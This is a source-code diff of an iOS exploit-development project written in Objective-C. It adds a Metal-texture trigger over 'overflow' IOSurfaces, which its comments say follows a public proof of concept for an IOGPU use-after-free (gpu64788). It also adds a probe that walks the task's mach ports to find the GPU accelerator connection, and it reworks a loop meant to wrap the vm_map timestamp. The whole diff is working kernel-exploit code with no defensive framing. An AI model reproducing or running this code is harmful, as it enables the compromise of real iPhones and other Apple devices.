@@ -31,14 +31,40 @@
 #import <unistd.h>
 #import <stdio.h>
 #import <time.h>
+#import <errno.h>
+#import <string.h>
 
 #import "Modules.h"
 #import "AppDelegate.h"
 #import "Util.h"
 
 // Metal is linked in build.sh, but the SDK's Metal umbrella does not expose
-// its types to this translation unit (measured on the CI toolchain), so the
-// texture trigger is disabled and the selector sweep is the oracle.
+// its types to this translation unit (measured on the CI toolchain: MTLDevice
+// undeclared despite -framework Metal).  Hand-declare the minimal surface we
+// need - the signatures match the runtime (note the lowercase "iosurface:",
+// exactly as the CI compiler suggested), and Metal.framework provides the
+// implementations at link time.
+@protocol MTLTexture
+@end
+
+@interface MTLTextureDescriptor : NSObject
++ (instancetype)texture2DDescriptorWithPixelFormat:(NSUInteger)pixelFormat
+                                            width:(NSUInteger)width
+                                           height:(NSUInteger)height
+                                        mipmapped:(BOOL)mipmapped;
+@property (nonatomic) NSUInteger usage;
+@end
+
+@protocol MTLDevice <NSObject>
+- (id<MTLTexture>)newTextureWithDescriptor:(MTLTextureDescriptor *)descriptor
+                                iosurface:(struct __IOSurface *)iosurface
+                                    plane:(NSUInteger)plane;
+@end
+
+extern id<MTLDevice> MTLCreateSystemDefaultDevice(void);
+
+#define RS_MTL_PIXEL_BGRA8UNORM 80
+#define RS_MTL_USAGE_SHADERREAD 1
 
 // IOSurface: not importable from the plain iOS SDK
 typedef struct __IOSurface *IOSurfaceRef_;
@@ -100,17 +126,60 @@ NSString *ModIOGPUUAFOracle(void) {
             uint32_t id = IOSurfaceGetID(s);
             AveLog(S(@"    surface %-24s -> id=%u alloc=%zu", O[i].tag, id, IOSurfaceGetAllocSize(s)));
             made++;
-            // The Metal texture path (newTextureWithDescriptor:iosurface:plane:)
-            // is how the public PoC reaches create_resource_iosurface, but the
-            // SDK's Metal umbrella does not expose the types to this compile
-            // (measured: MTLDevice undeclared despite -framework Metal), so the
-            // trigger is left to the selector sweep below: the oracle codes
-            // (0xe00002be stale-processed vs 0xe00002c2 not-found) are the
-            // measurement, and the overflow surfaces are created either way.
+            // The trigger: a Metal texture over the overflow surface is how the
+            // public PoC reaches IOGPUDevice::create_resource_iosurface.
+            @try {
+                id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+                if (dev) {
+                    MTLTextureDescriptor *td = [MTLTextureDescriptor
+                        texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
+                        width:O[i].w height:O[i].h mipmapped:NO];
+                    td.usage = RS_MTL_USAGE_SHADERREAD;
+                    id<MTLTexture> tex = [dev newTextureWithDescriptor:td
+                                                            iosurface:(struct __IOSurface *)s
+                                                                plane:0];
+                    AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
+                } else {
+                    AveLog(S(@"    texture %-24s -> no MTLDevice", O[i].tag));
+                }
+            } @catch (NSException *e) {
+                AveLog(S(@"    texture %-24s -> threw %@", O[i].tag, e.reason));
+            }
             CFRelease(s);
         }
     }
     AveLog(S(@"[gpu64788] %d/4 overflow surfaces created", made));
+
+    // ---- (2b) find the GPU connection in OUR task (the PoC's method: the
+    // accelerator connection is created by the GPU daemon, not by us, so
+    // enumerate the task's send rights and probe each) ----
+    if (!gpu) {
+        mach_port_name_array_t ports = NULL;
+        mach_port_type_array_t types = NULL;
+        mach_port_mscount_t pn = 0;
+        if (mach_ports_lookup(mach_task_self(), &ports, &types, &pn) == KERN_SUCCESS && pn) {
+            AveLog(S(@"[gpu64788] task has %u mach ports - probing send rights", pn));
+            int answered = 0;
+            for (mach_port_mscount_t i = 0; i < pn; i++) {
+                if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
+                uint64_t in[4] = {1, 0, 0, 0};
+                uint64_t out[4] = {0, 0, 0, 0};
+                size_t outSz = sizeof(out);
+                kern_return_t r = IOConnectCallMethod(ports[i], 0, in, 4, NULL, 0,
+                                                      out, &outSz, NULL, NULL);
+                // a connection that does not answer with "not a connection"
+                if (r != (kern_return_t)0xe00002c2 && r != KERN_SUCCESS &&
+                    r != (kern_return_t)0xe00002bd) {
+                    AveLog(S(@"    port %#x sel 0 -> %#x", ports[i], r));
+                    answered++;
+                    if (!gpu && r != (kern_return_t)0x10000003) gpu = ports[i];
+                }
+            }
+            AveLog(S(@"[gpu64788] %d/%u ports answered a probe", answered, pn));
+            vm_deallocate(mach_task_self(), (vm_address_t)ports, 4 * pn);
+            vm_deallocate(mach_task_self(), (vm_address_t)types, 4 * pn);
+        }
+    }
 
     // ---- (3) sweep the accelerator selectors, log every code ----
     // The PoC's oracle codes: 0xe00002c2 (resource not found) vs
@@ -175,11 +244,19 @@ NSString *ModVmMapWrap(void) {
     struct timespec t0, t1;
     clock_gettime(CLOCK_MONOTONIC, &t0);
     long long n = 0;
+    int first_errno = 0;
     for (long long i = 0; i < kRuns; i++) {
         // each pair = one entry insert + one remove in the SAME map
-        void *p = mmap((char *)base + kPage * 2, kPage, PROT_READ | PROT_WRITE,
-                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
-        if (p != MAP_FAILED) { munmap(p, kPage); n += 2; }
+        // (plain mmap/munmap: every insert/remove bumps map->timestamp)
+        void *p = mmap(NULL, kPage, PROT_READ | PROT_WRITE,
+                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (p != MAP_FAILED) {
+            munmap(p, kPage);
+            n += 2;
+        } else if (!first_errno) {
+            first_errno = errno;
+            AveLog(S(@"[vmwrap] first mmap failure: errno=%d (%s)", errno, strerror(errno)));
+        }
         if ((i & 0xFFFFFF) == 0xFFFFFF) {
             clock_gettime(CLOCK_MONOTONIC, &t1);
             double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
